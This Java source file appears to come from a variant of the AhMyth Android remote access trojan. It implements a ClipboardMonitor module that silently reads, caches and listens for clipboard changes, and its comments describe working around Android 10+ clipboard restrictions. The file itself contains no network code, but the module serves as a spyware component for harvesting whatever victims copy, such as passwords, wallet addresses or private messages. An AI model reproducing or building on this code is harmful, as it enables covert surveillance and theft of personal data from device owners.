package ahmyth.mine.king.ahmyth;

import android.content.ClipData;
import android.content.ClipDescription;
import android.content.Context;
import android.net.Uri;
import android.os.Build;
import android.os.Looper;
import android.util.Log;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

public class ClipboardMonitor {

    private static final String TAG = "ClipboardMonitor";
    private static String cachedClipboardText = ""; // Cache last clipboard content
    private static long cachedTimestamp = 0;
    private static final long CACHE_TIMEOUT = 60000; // 60 seconds cache validity
    
    private Context context;
    private android.content.ClipboardManager clipboardManager;
    private ClipboardMonitor.OnClipboardChangedListener listener;

    public interface OnClipboardChangedListener {
        void onClipboardChanged(String text);
    }

    public ClipboardMonitor(Context context) {
        this.context = context;
        this.clipboardManager = (android.content.ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
    }

    public JSONObject getClipboardText() {
        JSONObject result = new JSONObject();
        try {
            // On Android 10+, clipboard can only be read when app is in foreground
            // and only content copied while app was in foreground
            // So we try to read current clipboard, but also check cache
            
            String currentText = null;
            boolean hasCurrentData = false;
            
            // Try to read current clipboard (may fail on Android 10+ if not in foreground)
            try {
                if (Looper.myLooper() == Looper.getMainLooper()) {
                    JSONObject currentResult = new JSONObject();
                    readClipboard(currentResult);
                    if (currentResult.optBoolean("hasData", false)) {
                        currentText = currentResult.optString("text", "");
                        hasCurrentData = !currentText.isEmpty();
                        // Update cache
                        if (hasCurrentData) {
                            cachedClipboardText = currentText;
                            cachedTimestamp = System.currentTimeMillis();
                        }
                    }
                } else {
                    // Post to main thread
                    final JSONObject[] tempResult = {new JSONObject()};
                    new android.os.Handler(Looper.getMainLooper()).post(() -> {
                        try {
                            readClipboard(tempResult[0]);
                        } catch (Exception e) {
                            Log.e(TAG, "Error reading clipboard on main thread", e);
                        }
                    });
                    // Wait a bit for result
                    Thread.sleep(200);
                    if (tempResult[0].optBoolean("hasData", false)) {
                        currentText = tempResult[0].optString("text", "");
                        hasCurrentData = !currentText.isEmpty();
                        if (hasCurrentData) {
                            cachedClipboardText = currentText;
                            cachedTimestamp = System.currentTimeMillis();
                        }
                    }
                }
            } catch (Exception e) {
                Log.w(TAG, "Could not read current clipboard (Android 10+ restriction?): " + e.getMessage());
            }
            
            // If we got current data, use it
            if (hasCurrentData && currentText != null && !currentText.isEmpty()) {
                result.put("text", currentText);
                result.put("hasData", true);
                result.put("source", "current");
                return result;
            }
            
            // Otherwise, check cache if it's recent
            if (cachedClipboardText != null && !cachedClipboardText.isEmpty()) {
                long cacheAge = System.currentTimeMillis() - cachedTimestamp;
                if (cacheAge < CACHE_TIMEOUT) {
                    Log.d(TAG, "Using cached clipboard content (age: " + (cacheAge / 1000) + "s)");
                    result.put("text", cachedClipboardText);
                    result.put("hasData", true);
                    result.put("source", "cache");
                    result.put("cacheAge", cacheAge);
                    return result;
                } else {
                    Log.d(TAG, "Cache expired (age: " + (cacheAge / 1000) + "s)");
                }
            }
            
            // No current data and no valid cache
            result.put("text", "");
            result.put("hasData", false);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                result.put("error", "Clipboard empty or restricted. On Android 10+, clipboard can only be read when app is in foreground and content was copied while app was active.");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading clipboard", e);
            try {
                result.put("text", "");
                result.put("hasData", false);
                result.put("error", e.getMessage());
            } catch (Exception ex) {
                Log.e(TAG, "Error creating error result", ex);
            }
        }
        return result;
    }

    private void readClipboard(JSONObject result) throws Exception {
        if (clipboardManager == null) {
            Log.w(TAG, "ClipboardManager is null");
            result.put("text", "");
            result.put("hasData", false);
            result.put("error", "ClipboardManager not available");
            return;
        }

        // Check if clipboard has data
        if (!clipboardManager.hasPrimaryClip()) {
            Log.d(TAG, "Clipboard is empty (no primary clip)");
            result.put("text", "");
            result.put("hasData", false);
            return;
        }

        ClipData clipData = clipboardManager.getPrimaryClip();
        if (clipData == null) {
            Log.d(TAG, "ClipData is null");
            result.put("text", "");
            result.put("hasData", false);
            return;
        }

        if (clipData.getItemCount() == 0) {
            Log.d(TAG, "ClipData has no items");
            result.put("text", "");
            result.put("hasData", false);
            return;
        }

        // Get the first item
        ClipData.Item item = clipData.getItemAt(0);
        String text = null;

        // Try to get text directly
        CharSequence charSeq = item.getText();
        if (charSeq != null) {
            text = charSeq.toString();
            Log.d(TAG, "Got text from clipboard: " + (text.length() > 50 ? text.substring(0, 50) + "..." : text));
        } else {
            // Try to get text from URI (for some clipboard types)
            Uri uri = item.getUri();
            if (uri != null) {
                Log.d(TAG, "Clipboard has URI: " + uri.toString());
                // Try to read text from URI
                try {
                    ClipDescription description = clipData.getDescription();
                    if (description != null && description.hasMimeType("text/plain")) {
                        InputStream inputStream = context.getContentResolver().openInputStream(uri);
                        if (inputStream != null) {
                            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
                            StringBuilder stringBuilder = new StringBuilder();
                            String line;
                            while ((line = reader.readLine()) != null) {
                                stringBuilder.append(line).append("\n");
                            }
                            reader.close();
                            inputStream.close();
                            text = stringBuilder.toString().trim();
                            Log.d(TAG, "Got text from URI: " + (text.length() > 50 ? text.substring(0, 50) + "..." : text));
                        }
                    }
                } catch (Exception e) {
                    Log.w(TAG, "Could not read text from URI", e);
                }
            }

            // Try to coerce to text (Android API)
            if (text == null || text.isEmpty()) {
                try {
                    text = item.coerceToText(context).toString();
                    if (text != null && !text.isEmpty()) {
                        Log.d(TAG, "Got text via coerceToText: " + (text.length() > 50 ? text.substring(0, 50) + "..." : text));
                    }
                } catch (Exception e) {
                    Log.w(TAG, "Could not coerce to text", e);
                }
            }
        }

        if (text != null && !text.isEmpty()) {
            result.put("text", text);
            result.put("hasData", true);
        } else {
            Log.d(TAG, "No text found in clipboard");
            result.put("text", "");
            result.put("hasData", false);
        }
    }

    public void setClipboardListener(OnClipboardChangedListener listener) {
        this.listener = listener;
        if (clipboardManager != null) {
            try {
                clipboardManager.addPrimaryClipChangedListener(new android.content.ClipboardManager.OnPrimaryClipChangedListener() {
                    @Override
                    public void onPrimaryClipChanged() {
                        Log.d(TAG, "Clipboard changed - attempting to read");
                        if (ClipboardMonitor.this.listener != null) {
                            // Try to read clipboard immediately when it changes
                            // This works better on Android 10+ because the listener fires when app might be active
                            try {
                                JSONObject clipboard = getClipboardText();
                                if (clipboard.optBoolean("hasData", false)) {
                                    String text = clipboard.optString("text", "");
                                    if (!text.isEmpty()) {
                                        // Update cache
                                        cachedClipboardText = text;
                                        cachedTimestamp = System.currentTimeMillis();
                                        // Notify listener
                                        ClipboardMonitor.this.listener.onClipboardChanged(text);
                                        Log.d(TAG, "Clipboard change captured: " + (text.length() > 50 ? text.substring(0, 50) + "..." : text));
                                    }
                                } else {
                                    Log.d(TAG, "Clipboard changed but could not read content (Android 10+ restriction?)");
                                }
                            } catch (Exception e) {
                                Log.e(TAG, "Error in clipboard change listener", e);
                            }
                        }
                    }
                });
                Log.d(TAG, "Clipboard listener registered");
            } catch (Exception e) {
                Log.e(TAG, "Error registering clipboard listener", e);
            }
        }
    }
}

